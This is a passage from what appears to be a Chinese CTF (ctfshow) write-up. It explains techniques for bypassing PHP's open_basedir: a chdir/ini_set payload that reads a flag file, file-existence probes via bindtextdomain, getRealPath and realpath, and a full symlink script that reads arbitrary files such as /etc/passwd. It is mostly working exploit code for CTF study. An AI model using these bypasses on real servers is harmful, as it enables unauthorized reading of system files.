punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ctfshowflag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>利用bindtextdomain()函数Bypass</p><p>这个方法也只能捞捞文件名</p><blockquote><p><strong>bindtextdomain()函数</strong></p><p>(PHP 4, PHP 5, PHP 7)</p><p>bindtextdomain()函数用于绑定domain到某个目录的函数。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">bindtextdomain</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$domain</span> <span class="token punctuation">,</span> <span class="token keyword type-hint">string</span> <span class="token variable">$directory</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>bindtextdomain()函数的第二个参数$directory是一个文件路径，它会在$directory存在的时候返回$directory，不存在则返回false。</p></blockquote><p>我们就可以通过修改directory参数根据返回值来判断文件是否存在</p></li><li><p>利用SplFileInfo::getRealPath()类方法Bypass</p><p>这个和上面那个很相似，也是基于报错，直接给payload吧</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;b>open_basedir: '</span> <span class="token operator">.</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/b>&lt;br />'</span><span class="token punctuation">;</span><span class="token variable">$info</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SplFileInfo</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token operator">-></span><span class="token function">getRealPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>利用realpath()函数Bypass</p><blockquote>        <h3 id="realpath-函数"   >          <a href="#realpath-函数" class="heading-link"><i class="fas fa-link"></i></a><a href="#realpath-函数" class="headerlink" title="realpath()函数"></a>realpath()函数</h3>      <p>(PHP 4, PHP 5, PHP 7)</p><p>realpath — 返回规范化的绝对路径名。它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。</p><p>函数定义如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">realpath</span> <span class="token punctuation">(</span> <span class="token keyword type-hint">string</span> <span class="token variable">$path</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h3 id="Bypass"   >          <a href="#Bypass" class="heading-link"><i class="fas fa-link"></i></a><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h3>      <p>环境条件：Windows</p><p>基本原理是基于报错返回内容的不用，设置自定义的错误处理函数，循环遍历匹配到正则的报错信息的字符来逐个拼接成存在的文件名，另外是需要结合利用Windows下的两个特殊的通配符&lt;和&gt;，不然只能进行暴破。</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;b>open_basedir: %s&lt;/b>&lt;br />"</span><span class="token punctuation">,</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">set_error_handler</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'isexists'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'E:/wamp64/'</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyz0123456789_'</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$dir</span> <span class="token operator">.</span> <span class="token variable">$chars</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;>&lt;'</span><span class="token punctuation">;</span>        <span class="token function">realpath</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">isexists</span><span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/File\((.*)\) is not within/'</span><span class="token punctuation">;</span>        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%s &lt;br/>"</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，首字母不同的文件就被列出来了，首字母相同的文件中只列了第一个：</p><p><img src="https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/10.png"></p></li></ol><p>最后是大佬脚本</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** by phithon* From https://www.leavesongs.com* detail: http://cxsecurity.com/issue/WLB-2009110068*/</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'content-type: text/plain'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir: %s\nphp_version: %s\n"</span><span class="token punctuation">,</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">phpversion</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"disable_functions: %s\n"</span><span class="token punctuation">,</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'disable_functions'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$relat_file</span> <span class="token operator">=</span> <span class="token function">getRelativePath</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$paths</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">999</span><span class="token punctuation">;</span><span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token function">getRandStr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$paths</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$paths</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$paths</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$paths</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">-=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$paths</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$relat_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$paths</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'..'</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token variable">$j</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">array_fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$j</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">symlink</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$tmp</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'tmplink'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$tmp</span> <span class="token operator">=</span> <span class="token function">array_fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$j</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">symlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tmplink/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$tmp</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tmplink'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tmplink'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">delfile</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SCRIPT_NAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$exp</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span><span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"http://<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SERVER_NAME'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$exp</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"\n-----------------content---------------\n\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">delfile</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tmplink'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getRelativePath</span><span class="token punctuation">(</span><span class="token variable">$from</span><span class="token punctuation">,</span> <span class="token variable">$to</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// some compatibility fixes for Windows paths</span>  <span class="token variable">$from</span> <span class="token operator">=</span> <span class="token function">rtrim</span><span class="token punctuation">(</span><span class="token variable">$from</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\/'</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">;</span>  <span class="token variable">$from</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$from</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$to</span>   <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$from</span>   <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$from</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$to</span>     <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$to</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$relPath</span>  <span class="token operator">=</span> <span class="token variable">$to</span><span class="token punctuation">;</span>  <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$from</span> <span class="token keyword">as</span> <span class="token variable">$depth</span> <span class="token operator">=></span> <span class="token variable">$dir</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// find first non-matching dir</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token operator">===</span> <span class="token variable">$to</span><span class="token punctuation">[</span><span class="token variable">$depth</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// ignore this directory</span>      <span class="token function">array_shift</span><span class="token punctuation">(</span><span class="token variable">$relPath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// get number of remaining dirs to $from</span>      <span class="token variable">$remaining</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$from</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token variable">$depth</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$remaining</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// add traversals up to first matching dir</span>        <span class="token variable">$padLength</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$relPath</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token variable">$remaining</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$relPath</span> <span class="token operator">=</span> <span class="token function">array_pad</span><span class="token punctuation">(</span><span class="token variable">$relPath</span><span class="token punctuation">,</span> <span class="token variable">$padLength</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$relPath</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./'</span> <span class="token operator">.</span> <span class="token variable">$relPath</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span> <span class="token variable">$relPath</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">delfile</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        @<span class="token function">chmod</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$mydir</span> <span class="token operator">=</span> @<span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token constant boolean">false</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token variable">$file</span> <span class="token operator">=</span> @<span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$mydir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">File_Str</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">!=</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">!=</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">delfile</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>         @<span class="token function">closedir</span><span class="token punctuation">(</span><span class="token variable">$mydir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        @<span class="token function">chmod</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> @<span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token variable">$deldir</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant boolean">true</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">File_Str</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'//'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">,</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">getRandStr</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$chars</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$randStr</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$randStr</span> <span class="token operator">.=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$chars</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token variable">$randStr</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>include远程文件后传参file即可</p><p><strong>806</strong></p>        <h3 id="php无参RCE"   >          <a href="#php无参RCE" class="heading-link"><i class="fas fa-link"></i></a><a href="#php无参RCE" class="headerlink" title="php无参RCE"></a>php无参RCE</h3>      <p>首先是一篇可供参考的<span class="exturl"><a class="exturl__link"   